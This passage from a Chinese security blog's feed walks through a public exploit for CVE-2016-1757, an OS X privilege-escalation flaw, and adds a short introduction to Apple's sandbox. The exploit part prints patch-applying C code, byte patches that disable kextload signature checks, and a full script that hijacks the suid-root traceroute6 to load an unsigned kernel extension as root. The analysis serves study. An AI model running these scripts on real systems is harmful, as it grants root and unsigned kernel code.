    <updated>2016-04-29T20:37:06.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0X00_摘要">0X00  摘要</h1><p>通过对<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="external">CVE-2016-1757</a>的<code>POC</code>进行分析，已经完全了解了这个这个漏洞的成因，这里带来其一个<code>Exploit</code>的分析。</p>
<p>相关的<code>poc</code>可以到我的<code>github</code>上面获取</p>
<p><a href="https://github.com/turingH/exploit" target="_blank" rel="external">https://github.com/turingH/exploit</a></p>
<p>或者直接在<code>google</code>的<code>project zero</code>中下载。</p>
<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;can=1&amp;q=OS%20X&amp;sort=-id" target="_blank" rel="external">https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;can=1&amp;q=OS%20X&amp;sort=-id</a></p>
<a id="more"></a>
<h1 id="0x01_Exploit概览">0x01 Exploit概览</h1><h2 id="1-1_Exploit使用到了哪些技术">1.1 Exploit使用到了哪些技术</h2><ol>
<li><a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="external">CVE-2016-1757</a>漏洞的原理。</li>
<li><a href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/" target="_blank" rel="external">利用patch绕过kextload对内核签名的检测</a>。</li>
</ol>
<h2 id="1-2_Exploit目录结构">1.2 Exploit目录结构</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">➜  executer ls -al</span><br><span class="line">total <span class="number">184</span></span><br><span class="line">drwxr-xr-x@ <span class="number">16</span> turing  staff    <span class="number">544</span>  <span class="number">4</span> <span class="number">19</span> <span class="number">11</span>:<span class="number">30</span> .</span><br><span class="line">drwxr-xr-x@ <span class="number">33</span> turing  staff   <span class="number">1122</span>  <span class="number">4</span> <span class="number">19</span> <span class="number">10</span>:<span class="number">29</span> ..</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff   <span class="number">6148</span>  <span class="number">3</span> <span class="number">30</span> <span class="number">16</span>:<span class="number">45</span> .DS_Store</span><br><span class="line">-rw-r--r--   <span class="number">1</span> turing  staff  <span class="number">16384</span>  <span class="number">4</span> <span class="number">19</span> <span class="number">11</span>:<span class="number">30</span> .executer.c.swp</span><br><span class="line">drwxr-xr-x@  <span class="number">3</span> root    wheel    <span class="number">102</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> FakeKext.kext</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff    <span class="number">397</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> Makefile</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff      <span class="number">0</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> __init__.py</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff   <span class="number">2061</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> build_<span class="built_in">exec</span>_patch.py</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff   <span class="number">1669</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> differ.py</span><br><span class="line">-rw-r--r--   <span class="number">1</span> turing  staff   <span class="number">2085</span>  <span class="number">4</span> <span class="number">12</span> <span class="number">14</span>:<span class="number">53</span> differ.pyc</span><br><span class="line">-rwxr-xr-x   <span class="number">1</span> turing  staff  <span class="number">15308</span>  <span class="number">4</span> <span class="number">13</span> <span class="number">11</span>:<span class="number">00</span> executer</span><br><span class="line">-rw-r--r--   <span class="number">1</span> turing  staff  <span class="number">17534</span>  <span class="number">4</span> <span class="number">19</span> <span class="number">11</span>:<span class="number">02</span> executer.c</span><br><span class="line">-rw-r--r--@  <span class="number">1</span> turing  staff     <span class="number">37</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> kextload_<span class="built_in">disable</span>_signature_checks.binpatch</span><br><span class="line">-rwxr-xr-x   <span class="number">1</span> turing  staff   <span class="number">1849</span>  <span class="number">4</span> <span class="number">13</span> <span class="number">10</span>:<span class="number">45</span> load_kext.sh</span><br><span class="line">-rwxr-xr-x@  <span class="number">1</span> turing  staff    <span class="number">591</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> root_shell.sh</span><br><span class="line">-rwxr-xr-x@  <span class="number">1</span> turing  staff   <span class="number">1106</span>  <span class="number">3</span> <span class="number">11</span> <span class="number">09</span>:<span class="number">55</span> unload_kext.sh</span><br><span class="line">➜  executer</span><br></pre></td></tr></table></figure>
<p>主要由5个部分组成</p>
<ul>
<li>FakeKext.kext：最终加载的测试内核扩展。</li>
<li>*.py: 用来生成对<code>traceroute6</code>的<code>binpatch</code>文件。</li>
<li>executer：通过<code>binpatch</code>文件，对需要执行的目标程序进行<code>patch</code>。</li>
<li>kextload_disable_signature_checks.binpatch：存储了<code>kextload</code>需要<code>patch</code>的地址与内容。</li>
<li>*.sh:驱动整个流程的脚本。</li>
</ul>
<h1 id="0x02_Exploit详细分析">0x02 Exploit详细分析</h1><p>如果直接打开<code>load_kext.sh</code>有<strong>可能</strong>一眼看不出到底流程是什么样子的，所以的先对几个重要的组件做一下详细的分析。</p>
<h2 id="2-1_executer与binpatch">2.1 executer与binpatch</h2><p><code>executer</code>是整个<code>exploit</code>中最核心的部分，核心功能有两个。</p>
<ul>
<li>通过<code>apply_patch</code>函数获取目标进程需要<code>patch</code>的内容并保存在内存中。</li>
<li>通过<code>fork</code>子进程在执行目标程序时存在的时间窗口通过<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/#1-3_Ports" target="_blank" rel="external">PORT</a>对目标进程进行内存的改写。</li>
</ul>
<p>通过时间窗口改写目标进程的内存和<code>POC</code>中的实现大同小异，可以参考之前分析<code>POC</code>的<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="external">文章</a>。</p>
<p>这里简单的分析一个<code>apply_patch</code>函数与</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// at what offset (rounded down to a page boundary) from the start of the mapping in the target should we write?</span></span><br><span class="line"><span class="keyword">size_t</span> target_patch_start_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// how much should we write (rounded up to a page boundary)</span></span><br><span class="line"><span class="keyword">size_t</span> target_patch_write_length = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pointer to the replacement bytes to overwrite with</span></span><br><span class="line"><span class="keyword">char</span>* replacement_bytes = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* apply the patch, recording the lowest and highest addresses we touch */</span></span><br><span class="line"><span class="comment">// original is page-aligned</span></span><br><span class="line"><span class="comment">// 对original文件进行patch</span></span><br><span class="line"><span class="comment">// 这个patch的函数只是为了对kextload进行patch，关闭对未签名内核扩展的验证</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* kextload_disable_signature_checks</span><br><span class="line"> * 0000000000000000  C9 20 00 00 03 00 00 00  31 C0 C3 94 27 00 00 05  . ......1...'...</span><br><span class="line"> * 0000000000000010  00 00 00 90 90 90 31 C0  0D 28 00 00 05 00 00 00  ......1..(......</span><br><span class="line"> * 0000000000000020  90 90 90 31 C0                                    ...1.</span><br><span class="line">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 理论上patch_length = 0x1000,因为length经过roundup的处理。</span></span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">apply_patch</span><span class="params">(<span class="keyword">char</span>* original, size_t original_length, <span class="keyword">char</span>* patch, size_t patch_length)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// patch format is:</span></span><br><span class="line">  <span class="comment">// u32 offset</span></span><br><span class="line">  <span class="comment">// u32 length</span></span><br><span class="line">  <span class="comment">// u8 * length bytes to be written</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//这两个字段用来计算内存中需要保存的数据的开始位置和解释位置</span></span><br><span class="line">  <span class="keyword">char</span>* lowest = (<span class="keyword">char</span>*)UINTPTR_MAX; </span><br><span class="line">  <span class="keyword">char</span>* highest = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> remaining = patch_length;</span><br><span class="line">  <span class="keyword">while</span> (remaining &gt; <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> offset = *(<span class="keyword">uint32_t</span>*)patch;</span><br><span class="line">    <span class="keyword">uint32_t</span> length = *(<span class="keyword">uint32_t</span>*)(patch+<span class="number">4</span>);</span><br><span class="line">    remaining -= <span class="number">8</span>;</span><br><span class="line">    patch += <span class="number">8</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/*</span><br><span class="line">    	以kextload_disable_signature_checks为例</span><br><span class="line">    	0x000020c9处开始0x00000003个字节改写为0x31 0xc0 0xc3</span><br><span class="line">    	0x00002794处开始0x00000005个字节改写为0x90 0x90 0x90 0x31 0xc0</span><br><span class="line">    	0x0000280D处开始0x00000005个字节改写为0x90 0x90 0x90 0x31 0xc0</span><br><span class="line">    */</span></span><br><span class="line">    </span><br><span class="line">   	<span class="comment">/* 错误处理*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// record if we're extending the boundaries of touched pages</span></span><br><span class="line">    <span class="comment">// 根据patch的地址重新计算两个变量值</span></span><br><span class="line">    <span class="keyword">if</span> ((original+offset) &lt; lowest) &#123;</span><br><span class="line">      lowest = original+offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((original+offset+length) &gt; highest) &#123;</span><br><span class="line">      highest = original+offset+length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// apply the patch</span></span><br><span class="line">    <span class="built_in">memcpy</span>(original+offset, patch, length);</span><br><span class="line">    remaining -= length;</span><br><span class="line">    patch += length;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//需要改写到目标进程的数据的起始</span></span><br><span class="line">  replacement_bytes = ptr_rounddown(lowest);</span><br><span class="line">  <span class="comment">//改写内容在目标进程中的起始位置</span></span><br><span class="line">  target_patch_start_offset = replacement_bytes - original;</span><br><span class="line">  <span class="comment">//需要改写的内容的长度</span></span><br><span class="line">  target_patch_write_length = ptr_roundup(highest) - replacement_bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结合对<code>port</code>的利用，流程大致如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/patch.png" alt="patch"></p>
<p>所以<code>executer</code>可以理解为一个抽象的工具，该工具的作用就是通过<code>binpatch</code>文件的内容，对目标程序进行<code>patch</code>并执行。</p>
<h2 id="2-2_通过Patch绕过加载驱动对签名的要求">2.2 通过Patch绕过加载驱动对签名的要求</h2><p>整个bindiff的比较，以及源码位置可以参照之前的这篇文章。<a href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/" target="_blank" rel="external">利用patch绕过kextload对内核签名的检测</a>。</p>
<p>这里说一下几个被<code>patch</code>掉的函数的关系。</p>
<table>
<thead>
<tr>
<th>patch点</th>
<th>行为</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x000020c9</td>
<td>整个函数内容变为return 0；</td>
<td>使得加载扩展时的权限检测都返回成功</td>
</tr>
<tr>
<td>0x00002794</td>
<td>绕过对sub_0979函数的调用</td>
<td>sub_0979会调用签名合法的检测</td>
</tr>
<tr>
<td>0x0000280d</td>
<td>绕过对sub_085c函数的调用</td>
<td>sub_085c会调用sub_0979</td>
</tr>
</tbody>
</table>
<h2 id="2-3_load_kext-sh">2.3 load_kext.sh</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"># loading an unsigned kext is a two step process - first we need root</span><br><span class="line"># then we need to get the com.apple.rootless.kext-management entitlement</span><br><span class="line"></span><br><span class="line"># so let's build a simple shellscript to run as root:</span><br><span class="line"></span><br><span class="line"># 加载一个没有签名的驱动程序</span><br><span class="line"># 1.root权限</span><br><span class="line"># 2.获取com.apple.rootless.kext-management权限</span><br><span class="line"></span><br><span class="line">if [ -z $1 ]</span><br><span class="line">then</span><br><span class="line">  echo 'usage: ./load_kext.sh &lt;path/to/kext&gt;'</span><br><span class="line">  exit $E_MISSING_POS_PARAM</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># we have a binary patch for the 10.11.3 version of kextload (which has the kext-management entitlement)</span><br><span class="line"># so lets build a script we can exec as root to apply that patch and load our kext</span><br><span class="line"></span><br><span class="line"># 通过patch可以使得kextload拥有权限</span><br><span class="line"></span><br><span class="line"># first, we need a thin'ed version of kextload</span><br><span class="line"># 从fat格式中提取x86_64的macho文件</span><br><span class="line">lipo -thin x86_64 -output kextload_64 `which kextload`</span><br><span class="line"></span><br><span class="line"># 生成patch kextload并加载内核扩展的脚本</span><br><span class="line">echo '#!/bin/zsh' &gt; kext_loading_helper.sh</span><br><span class="line">echo "# run me as root to load: $1" &gt;&gt; kext_loading_helper.sh</span><br><span class="line">echo "/usr/sbin/chown -R root:wheel $1" &gt;&gt; kext_loading_helper.sh</span><br><span class="line">echo "./executer -p kextload_disable_signature_checks.binpatch -o kextload_64 -- `which kextload` $1" &gt;&gt; kext_loading_helper.sh</span><br><span class="line">chmod +x kext_loading_helper.sh</span><br><span class="line"></span><br><span class="line"># build a binary patch to apply to traceroute6 (a suid-root binary, any will do though*) which overwrites</span><br><span class="line"># its entrypoint with shellcode to exec the script we just wrote (note that its a zsh script so will maintain euid 0)</span><br><span class="line"># 根据python脚本生成对traceroute6进行patch的binpatch文件</span><br><span class="line"># 目标是为了利用漏洞在root权限下执行上面生成的kext_loading_helper.sh脚本</span><br><span class="line">python build_exec_patch.py `which traceroute6` `pwd`/kext_loading_helper.sh traceroute6_exec_kextloader.binpatch</span><br><span class="line"></span><br><span class="line"># use the exploit to apply that patch at exec time to the suid-root binary</span><br><span class="line"># 利用刚刚生成的binpatch执行traceroute6</span><br><span class="line">./executer -p traceroute6_exec_kextloader.binpatch -o `which traceroute6` -- `which traceroute6` -invalid</span><br><span class="line"></span><br><span class="line"># cleanup</span><br><span class="line">rm -rf kextload_64 kext_loading_helper.sh traceroute6_exec_kextloader.binpatch</span><br><span class="line"></span><br><span class="line"># * if you choose a fat binary pass a lipo'ed thin version to -o</span><br><span class="line"># so lets build a script we can exec as root to apply that patch and load our kext:</span><br></pre></td></tr></table></figure>
<p>整体的执行流程大致如下图所示:</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/kextload.png" alt="kextload"></p>
<h1 id="0x03_小结">0x03 小结</h1><p>至此<code>CVE-2016-1757</code>的分析告一段落，结合<code>POC</code>的分析有几个知识需要巩固与思考。</p>
<ul>
<li><code>PORT</code>的使用。</li>
<li><code>exec</code>的流程。</li>
<li>内存<code>patch</code>在漏洞利用时的用法。</li>
<li>在<code>exec</code>的启动流程中，根据新旧内存对象替换的时机比较稳定的找到时间窗口。</li>
</ul>
<p>漏洞的成因个人总结为2点：</p>
<ul>
<li>进程在执行过程中权限会得到提高</li>
<li>进程在执行的流程存在被<code>patch</code>的机会</li>
</ul>
<h1 id="引用">引用</h1><p>1.<a href="http://googleprojectzero.blogspot.com/2016/03/race-you-to-kernel.html" target="_blank" rel="external">Race you to the kernel!</a></p>
<p>2.<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;redir=1" target="_blank" rel="external">Logic error when exec-ing suid binaries allows code execution as root on OS X/iOS</a></p>
<h1 id="PS">PS</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/" target="_blank" rel="external">http://turingh.github.io/</a></p>
<p>欢迎大家来探讨，不足之处还请指正。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0X00_摘要">0X00  摘要</h1><p>通过对<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>的<code>POC</code>进行分析，已经完全了解了这个这个漏洞的成因，这里带来其一个<code>Exploit</code>的分析。</p>
<p>相关的<code>poc</code>可以到我的<code>github</code>上面获取</p>
<p><a href="https://github.com/turingH/exploit">https://github.com/turingH/exploit</a></p>
<p>或者直接在<code>google</code>的<code>project zero</code>中下载。</p>
<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;can=1&amp;q=OS%20X&amp;sort=-id">https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;can=1&amp;q=OS%20X&amp;sort=-id</a></p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
      <category term="execv" scheme="http://yoursite.com/tags/execv/"/>
    
      <category term="ports" scheme="http://yoursite.com/tags/ports/"/>
    
      <category term="race" scheme="http://yoursite.com/tags/race/"/>
    
      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
    
      <category term="CVE" scheme="http://yoursite.com/categories/OS-X/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[apple沙盒研究之基础知识]]></title>
    <link href="http://yoursite.com/2016/04/18/apple%E6%B2%99%E7%9B%92%E7%A0%94%E7%A9%B6%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://yoursite.com/2016/04/18/apple沙盒研究之基础知识/</id>
    <published>2016-04-18T15:12:47.000Z</published>
    <updated>2016-04-19T18:52:38.000Z</updated>
    <content type="html"><![CDATA[<h1 id="1_基础知识">1 基础知识</h1><h1 id="1-1_什么是沙盒？">1.1 什么是沙盒？</h1><blockquote>
<p>在<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8" target="_blank" rel="external">计算机安全</a>领域，<strong>沙盒</strong>（英语：sandbox，又译为<strong>沙箱</strong>）是一种安全机制，为运行中的程序提供的隔离环境。通常是作为一些来源不可信、具破坏力或无法判定程序意图的程序提供实验之用<a href="https://zh.wikipedia.org/wiki/%E6%B2%99%E7%9B%92_(%E9%9B%BB%E8%85%A6%E5%AE%89%E5%85%A8" target="_blank" rel="external">[1]</a>#cite_note-1)。</p>
<p>沙盒通常严格控制其中的程序所能访问的资源，比如，沙盒可以提供<a href="https://zh.wikipedia.org/wiki/%E5%A1%97%E9%8A%B7%E7%A9%BA%E9%96%93" target="_blank" rel="external">用后即回收</a>的磁盘及内存空间。在沙盒中，网络访问、对真实系统的访问、对输入设备的读取通常被禁止或是严格限制。从这个角度来说，沙盒属于<a href="https://zh.wikipedia.org/wiki/%E8%99%9A%E6%8B%9F%E5%8C%96" target="_blank" rel="external">虚拟化</a>的一种。</p>
<p>沙盒中的所有改动对<a href="https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F" target="_blank" rel="external">操作系统</a>不会造成任何损失。通常，这种技术被<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA" target="_blank" rel="external">计算机</a>技术人员广泛用于测试可能<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92" target="_blank" rel="external">带毒</a>的程序或是其他的<a href="https://zh.wikipedia.org/wiki/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6" target="_blank" rel="external">恶意代码</a><a href="https://zh.wikipedia.org/wiki/%E6%B2%99%E7%9B%92_(%E9%9B%BB%E8%85%A6%E5%AE%89%E5%85%A8" target="_blank" rel="external">[2]</a>#cite_note-2)。</p>
<p>— 维基百科,沙盒 (计算机安全)</p>
</blockquote>
<p>这样一段话说的已经很清楚了，关于在<code>OS X</code>系统中沙盒的简单应用，也有文章解释过了，这些不是本文的核心内容，有兴趣的读者可以自行<code>google</code>。</p>
<p>在<code>OS X</code>以及<code>IOS</code>系统中限制了进程对一些资源的访问权限，例如网络、某些特殊路径、文件的读写等等，限定了进程的一些行为，从而保证进程不会做出超越权限的操作。</p>
<a id="more"></a>
<p>沙盒听上去的感觉是一个进程在一个有保护的环境中执行，不会做出规定范围内不允许的事情，给人的感觉可能是这样的：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/apple_sandbox/sandbox_feels_like.png.png" alt="沙盒"></p>
<p>这样的理解对应用开发来说已经够用了，通过理解沙盒的内部实现，发现沙盒的实质其实更像是这样的：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/apple_sandbox/sandbox_really.png" alt="沙盒"></p>
<p>而在<code>OS X</code>中沙盒也被称作<code>seatbelt</code>。<code>APP</code>的一举一动都被<code>TrustedBSD</code>的<code>HOOK</code>组件监控，根据沙盒使用的<code>profile</code>中的配置做出相应的处理。</p>
<p>下面 就通过简单的分析沙盒的工作流程，详细了解沙盒的工作原理。</p>
<h2 id="1-2_沙盒工作流程与相关系统组件">1.2 沙盒工作流程与相关系统组件</h2><p>沙盒的大致工作流程入下图所示：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/apple_sandbox/sandbox_workflow.png" alt="sandbox_workflow"></p>
<ul>
<li><code>1</code>进程尝试进行一次系统调用（system call），调用内核功能。</li>
<li><code>2、3</code>MAC层需要根据该进程的安全策略判断此次系统调用是否可以执行。</li>
<li><code>4、5、6、7、8、9</code>如果存在策略的话，通过<code>sandbox.kext</code>（hook函数）和<code>AppleMatch.kext</code>（沙盒的profile解析）两个内核扩展实现权限的检查。</li>
<li><code>10</code>返回调用结果</li>
</ul>
<p>与沙盒系统相关的模块大致如下：</p>
<ul>
<li>libSystem.dylib: 提供<code>sandbox_init</code>、<code>sandbox_free_error</code>等函数。</li>
<li>libSandbox.dylib: 提供解析，编译，生成<code>*.sb</code>的沙盒<code>profile</code>的函数。</li>
<li>sandbox.kext：提供了system call的hook函数</li>
<li>AppleMatch.kext：提供了解析<code>profile</code>的函数</li>
</ul>
<p>结构图大致如下：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/apple_sandbox/sandbox_birdview.png" alt="结构图"></p>
<h1 id="1-3_小结">1.3 小结</h1><p>​    沙盒的工作流程大致可以总结为：</p>
<ol>
<li><p>通过<code>sandbox_init</code>初始化某沙盒策略脚本并编译为二进制文件</p>
</li>
<li><p>在进程进行<code>system call</code>时，通过<code>TrustedBSD</code>提供的<code>hook</code>模块，利用<code>Sandbox.kext</code>提供的<code>system call hook</code>函数，结合沙盒策略进行判断，该进程是否有权限执行该<code>system call</code>。</p>
</li>
</ol>
<p>   通过对这些基础知识的了解，可以进入对沙盒的进一步研究了，在下一章通过逆向以及部分源码，从代码实现的层面进行更深一层次的分析。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="1_基础知识">1 基础知识</h1><h1 id="1-1_什么是沙盒？">1.1 什么是沙盒？</h1><blockquote>
<p>在<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8">计算机安全</a>领域，<strong>沙盒</strong>（英语：sandbox，又译为<strong>沙箱</strong>）是一种安全机制，为运行中的程序提供的隔离环境。通常是作为一些来源不可信、具破坏力或无法判定程序意图的程序提供实验之用<a href="https://zh.wikipedia.org/wiki/%E6%B2%99%E7%9B%92_(%E9%9B%BB%E8%85%A6%E5%AE%89%E5%85%A8">[1]</a>#cite_note-1)。</p>
<p>沙盒通常严格控制其中的程序所能访问的资源，比如，沙盒可以提供<a href="https://zh.wikipedia.org/wiki/%E5%A1%97%E9%8A%B7%E7%A9%BA%E9%96%93">用后即回收</a>的磁盘及内存空间。在沙盒中，网络访问、对真实系统的访问、对输入设备的读取通常被禁止或是严格限制。从这个角度来说，沙盒属于<a href="https://zh.wikipedia.org/wiki/%E8%99%9A%E6%8B%9F%E5%8C%96">虚拟化</a>的一种。</p>
<p>沙盒中的所有改动对<a href="https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a>不会造成任何损失。通常，这种技术被<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA">计算机</a>技术人员广泛用于测试可能<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92">带毒</a>的程序或是其他的<a href="https://zh.wikipedia.org/wiki/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6">恶意代码</a><a href="https://zh.wikipedia.org/wiki/%E6%B2%99%E7%9B%92_(%E9%9B%BB%E8%85%A6%E5%AE%89%E5%85%A8">[2]</a>#cite_note-2)。</p>
<p>— 维基百科,沙盒 (计算机安全)</p>
</blockquote>
<p>这样一段话说的已经很清楚了，关于在<code>OS X</code>系统中沙盒的简单应用，也有文章解释过了，这些不是本文的核心内容，有兴趣的读者可以自行<code>google</code>。</p>
<p>在<code>OS X</code>以及<code>IOS</code>系统中限制了进程对一些资源的访问权限，例如网络、某些特殊路径、文件的读写等等，限定了进程的一些行为，从而保证进程不会做出超越权限的操作。</p>]]>
    
    </summary>
    
      <category term="sandbox" scheme="http://yoursite.com/tags/sandbox/"/>
    
      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[利用patch绕过kextload对内核签名的检测]]></title>
    <link href="http://yoursite.com/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/"/>
    <id>http://yoursite.com/2016/04/13/利用patch绕过kextload对内核签名的检测/</id>
    <published>2016-04-13T17:21:22.000Z</published>
    <updated>2016-04-19T18:44:37.000Z</updated>
